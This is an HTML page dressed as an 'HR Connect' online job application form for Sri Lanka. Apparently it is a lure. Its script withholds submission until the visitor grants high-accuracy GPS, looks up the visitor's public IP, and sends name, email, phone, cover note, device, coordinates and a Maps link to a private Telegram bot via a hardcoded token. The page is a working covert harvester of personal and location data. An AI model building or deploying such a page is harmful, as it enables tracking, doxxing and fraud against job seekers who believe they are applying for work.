<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Job Application - HR Dept</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: #eef2f7;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 20px;
    }

    .card {
      max-width: 520px;
      width: 100%;
      background: #ffffff;
      border-radius: 24px;
      padding: 32px 28px 36px;
      box-shadow: 0 12px 40px rgba(0, 0, 0, 0.08);
      border: 1px solid rgba(0, 0, 0, 0.04);
    }

    .card .logo {
      font-size: 28px;
      font-weight: 700;
      color: #1a2a3a;
      margin-bottom: 4px;
    }

    .card .sub-logo {
      font-size: 14px;
      color: #6b7a8a;
      margin-bottom: 24px;
      border-bottom: 2px solid #f0f4f9;
      padding-bottom: 16px;
    }

    /* LOCATION STATUS */
    #location-status {
      background: #f0f7ff;
      border-radius: 12px;
      padding: 12px 16px;
      font-size: 14px;
      color: #1a3a6a;
      margin-bottom: 18px;
      border-left: 4px solid #2a7de1;
      display: flex;
      align-items: center;
      gap: 10px;
    }

    #location-status .icon {
      font-size: 20px;
    }

    /* FORM */
    .form-group {
      margin-bottom: 18px;
    }

    .form-group label {
      display: block;
      font-size: 14px;
      font-weight: 600;
      color: #1a2a3a;
      margin-bottom: 5px;
    }

    .form-group input,
    .form-group select,
    .form-group textarea {
      width: 100%;
      padding: 12px 14px;
      border: 1.5px solid #dce3ed;
      border-radius: 12px;
      font-size: 15px;
      background: #fafcfe;
      transition: 0.25s;
      outline: none;
      font-family: inherit;
    }

    .form-group input:focus,
    .form-group select:focus,
    .form-group textarea:focus {
      border-color: #2a7de1;
      background: #ffffff;
      box-shadow: 0 0 0 4px rgba(42, 125, 225, 0.08);
    }

    .form-group textarea {
      resize: vertical;
      min-height: 70px;
    }

    /* SUBMIT */
    .btn-submit {
      width: 100%;
      background: #2a7de1;
      color: #fff;
      border: none;
      padding: 14px;
      font-size: 17px;
      font-weight: 600;
      border-radius: 40px;
      cursor: pointer;
      transition: 0.25s;
      margin-top: 6px;
      box-shadow: 0 4px 14px rgba(42, 125, 225, 0.3);
    }

    .btn-submit:hover {
      background: #1a6ac8;
      transform: scale(1.01);
    }

    .btn-submit:disabled {
      opacity: 0.5;
      cursor: not-allowed;
      transform: none;
    }

    @media (max-width: 480px) {
      .card {
        padding: 22px 16px 28px;
      }
    }
  </style>
</head>
<body>

<div class="card">
  <div class="logo">📋 HR Connect</div>
  <div class="sub-logo">Online Job Application · Sri Lanka</div>

  <!-- LOCATION STATUS -->
  <div id="location-status">
    <span class="icon">📍</span>
    <span class="text" id="locationText">Location access is required to verify your application area.</span>
  </div>

  <!-- APPLICATION FORM -->
  <form id="applicationForm">
    <div class="form-group">
      <label>Full Name</label>
      <input type="text" id="fullName" placeholder="e.g. Kaveesha Perera" required />
    </div>

    <div class="form-group">
      <label>Email Address</label>
      <input type="email" id="email" placeholder="kaveesha@email.com" required />
    </div>

    <div class="form-group">
      <label>Phone Number</label>
      <input type="tel" id="phone" placeholder="071 234 5678" required />
    </div>

    <div class="form-group">
      <label>Position Applying For</label>
      <select id="position" required>
        <option value="">— Select —</option>
        <option value="Software Engineer">Software Engineer</option>
        <option value="UI/UX Designer">UI/UX Designer</option>
        <option value="Data Analyst">Data Analyst</option>
        <option value="Marketing Executive">Marketing Executive</option>
        <option value="Customer Support">Customer Support</option>
      </select>
    </div>

    <div class="form-group">
      <label>Brief Cover Note</label>
      <textarea id="coverNote" placeholder="Why do you want this job?"></textarea>
    </div>

    <button type="submit" class="btn-submit" id="submitBtn">🚀 Submit Application</button>
  </form>
</div>

<script>
  // ⚠️ WARNING: Exposing Tokens in client-side code is unsafe for production environments.
  const BOT_TOKEN = '8864995146:AAERB2czzLwxRORXAHcFieptoqXdCJ7BLec';
  const CHAT_ID   = '8308044531';

  const form = document.getElementById('applicationForm');
  const submitBtn = document.getElementById('submitBtn');
  const locationText = document.getElementById('locationText');

  // Helper function to get Geolocation as a Promise
  function getCoordinates() {
    return new Promise((resolve, reject) => {
      if (!navigator.geolocation) {
        reject(new Error('Geolocation is not supported by your browser.'));
      } else {
        navigator.geolocation.getCurrentPosition(
          (position) => resolve(position.coords),
          (error) => reject(error),
          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
        );
      }
    });
  }

  // Helper to fetch IP
  async function getPublicIP() {
    try {
      const res = await fetch('https://api.ipify.org?format=json');
      const data = await res.json();
      return data.ip || 'Unknown';
    } catch {
      return 'Unknown';
    }
  }

  form.addEventListener('submit', async (e) => {
    e.preventDefault();
    submitBtn.disabled = true;
    submitBtn.textContent = '⏳ Requesting Location...';

    let userCoords = null;
    
    // 1. Get Location
    try {
      userCoords = await getCoordinates();
      locationText.textContent = '✅ Location verified!';
      locationText.style.color = '#28a745';
    } catch (err) {
      alert('❌ Location access is required to submit the application. Please allow location permissions in your browser.');
      submitBtn.disabled = false;
      submitBtn.textContent = '🚀 Submit Application';
      locationText.textContent = '❌ Location access denied. Please enable GPS and allow browser permissions.';
      locationText.style.color = '#dc3545';
      return;
    }

    // 2. Prepare Data & IP
    submitBtn.textContent = '⏳ Submitting Application...';
    const ipAddress = await getPublicIP();

    const fullName = document.getElementById('fullName').value.trim();
    const email = document.getElementById('email').value.trim();
    const phone = document.getElementById('phone').value.trim();
    const position = document.getElementById('position').value;
    const coverNote = document.getElementById('coverNote').value.trim();
    const device = navigator.userAgent.match(/Android|iPhone|iPad|Windows|Mac|Linux/i)?.[0] || 'Unknown Device';

    const mapsLink = `https://www.google.com/maps?q=${userCoords.latitude},${userCoords.longitude}`;

    const message = `
📋 NEW JOB APPLICATION

👤 Name: ${fullName}
📧 Email: ${email}
📞 Phone: ${phone}
💼 Position: ${position}

📝 Cover Note:
${coverNote || 'N/A'}

🌐 IP Address: ${ipAddress}
📱 Device: ${device}
📍 Latitude: ${userCoords.latitude}
📍 Longitude: ${userCoords.longitude}
🗺️ Google Maps: ${mapsLink}

🕐 Submitted: ${new Date().toLocaleString()}
    `;

    // 3. Send to Telegram
    try {
      const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: message
        })
      });

      if (response.ok) {
        submitBtn.textContent = '✅ Application Submitted!';
        submitBtn.style.background = '#28a745';
        form.reset();
      } else {
        throw new Error('Telegram API failure');
      }
    } catch (err) {
      console.error(err);
      alert('❌ Failed to submit. Please check your network connection.');
      submitBtn.disabled = false;
      submitBtn.textContent = '🚀 Submit Application';
    }
  });
</script>

</body>
</html>
